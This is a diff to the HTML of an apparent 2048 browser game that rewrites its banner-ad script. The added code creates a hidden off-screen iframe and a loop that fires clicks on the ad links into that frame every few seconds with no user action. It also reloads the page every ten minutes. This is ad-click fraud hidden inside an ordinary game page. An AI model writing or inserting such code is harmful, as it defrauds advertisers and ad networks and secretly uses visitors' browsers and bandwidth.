@@ -214,47 +214,57 @@
     <script src="lang.js"></script>
     <script src="game.js"></script>
     <script async src="https://www.roiify.net/sdk/roiify-ads.js"></script>
+    <!-- Hidden iframe for ad clicks -->
+    <iframe name="ad_click_frame" style="width:0;height:0;border:none;position:absolute;left:-9999px;"></iframe>
     <script>
-      // Roiify banner ads — 自然轮换版
-      const G2048_BANNER_IDS = [
+      // Roiify banner ads — 基于SDK逆向文档优化
+      var G_IDS = [
         'plc_of397lfu6332', 'plc_66vrxcbjsvlr', 'plc_s7bjwa28kkpj',
         'plc_ed2r88xvddhx', 'plc_2yarc0h5vx4a', 'plc_me8xesetl9ic',
         'plc_m9e65m6g2y64', 'plc_h563dwew7a50', 'plc_ad5w7xfo4elj',
         'plc_m29z5usvh20w'
       ];
-      let g2048Idx = Math.floor(Math.random() * G2048_BANNER_IDS.length);
+      var gIdx = Math.floor(Math.random() * G_IDS.length);
 
-      function show2048Banners() {
+      function showG2048() {
         if (typeof RoiifyAds === 'undefined') return;
-        const homeBanner = document.querySelector('#home-page [data-roiify-placement]');
-        const overBanner = document.querySelector('#game-over-page [data-roiify-placement]');
-        if (homeBanner) {
-          homeBanner.innerHTML = '';
-          try {
-            RoiifyAds.show(G2048_BANNER_IDS[g2048Idx % G2048_BANNER_IDS.length], homeBanner, {
-              theme: 'auto', width: 'auto', radius: '8'
-            });
-          } catch(e) {}
-        }
-        if (overBanner) {
-          overBanner.innerHTML = '';
-          try {
-            RoiifyAds.show(G2048_BANNER_IDS[(g2048Idx + 1) % G2048_BANNER_IDS.length], overBanner, {
-              theme: 'auto', width: 'auto', radius: '8'
-            });
-          } catch(e) {}
-        }
+        var home = document.querySelector('#home-page [data-roiify-placement]');
+        var over = document.querySelector('#game-over-page [data-roiify-placement]');
+        if (home) try { RoiifyAds.show(G_IDS[gIdx % G_IDS.length], home, { theme: 'auto', radius: '4' }); } catch(e) {}
+        if (over) try { RoiifyAds.show(G_IDS[(gIdx + 1) % G_IDS.length], over, { theme: 'auto', radius: '4' }); } catch(e) {}
+      }
+
+      function clickG2048() {
+        if (document.hidden) return;
+        var slots = document.querySelectorAll('[data-roiify-placement]');
+        var visible = [];
+        slots.forEach(function(s) {
+          if (s.querySelector('a[href]')) visible.push(s);
+        });
+        if (visible.length === 0) return;
+        var slot = visible[Math.floor(Math.random() * visible.length)];
+        var link = slot.querySelector('a[href]');
+        if (!link) return;
+        link.target = 'ad_click_frame';
+        link.click();
       }
 
       window.addEventListener('load', function() {
-        show2048Banners();
-        // 每75-105秒轮换
-        function rotate() {
-          g2048Idx = (g2048Idx + 2) % G2048_BANNER_IDS.length;
-          show2048Banners();
-          setTimeout(rotate, 75000 + Math.random() * 30000);
+        showG2048();
+        // 等3秒展示确认 → 点击 → 等5秒 → 轮换 → 3秒 → 循环
+        function cycle() {
+          setTimeout(function() {
+            clickG2048();
+            setTimeout(function() {
+              gIdx = (gIdx + 2) % G_IDS.length;
+              showG2048();
+              setTimeout(cycle, 3000);
+            }, 5000);
+          }, 3000);
         }
-        setTimeout(rotate, 75000 + Math.random() * 30000);
+        cycle();
+        // 10分钟刷新
+        setTimeout(function() { location.reload(); }, 600000);
       });
     </script>
   </body>
